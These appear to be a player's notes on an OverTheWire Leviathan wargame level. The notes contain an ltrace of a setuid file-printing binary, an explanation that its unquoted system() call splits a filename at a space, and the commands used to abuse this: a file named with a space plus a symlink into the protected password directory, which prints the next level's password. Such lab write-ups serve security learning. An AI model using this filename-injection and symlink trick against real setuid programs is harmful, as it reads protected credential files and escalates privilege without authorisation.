leviathan2@leviathan:/tmp/leviathan2$ ltrace ~/printfile level\ 3.pass
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("level 3.pass", 4)                               = 0
snprintf("/bin/cat level 3.pass", 511, "/bin/cat %s", "level 3.pass") = 21
geteuid()                                               = 12002
geteuid()                                               = 12002
setreuid(12002, 12002)                                  = 0
system("/bin/cat level 3.pass"/bin/cat: level: No such file or directory
/bin/cat: 3.pass: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                  = 256
+++ exited (status 0) +++


**************looking at the system call to the /bin/cat - we can see that it seperates spaces as two seperate commands.
we create a file that has a space in the filename.  like "level 3.pass"  and a symlink using the first word,  before the space of that file.  Then call the printfile executable and BAM!


leviathan2@leviathan:/tmp/leviathan2$ ~/printfile level\ 3.pass
Ahdiemoo1j
/bin/cat: 3.pass: No such file or directory
leviathan2@leviathan:/tmp/leviathan2$ ls -alh
total 228K
drwxr-sr-x   2 leviathan2 root 4.0K Apr 17 04:31 .
drwxrws-wt 171 root       root 220K Apr 17 04:32 ..
lrwxrwxrwx   1 leviathan2 root   30 Apr 17 04:31 level -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root    0 Apr 17 04:31 level 3.pass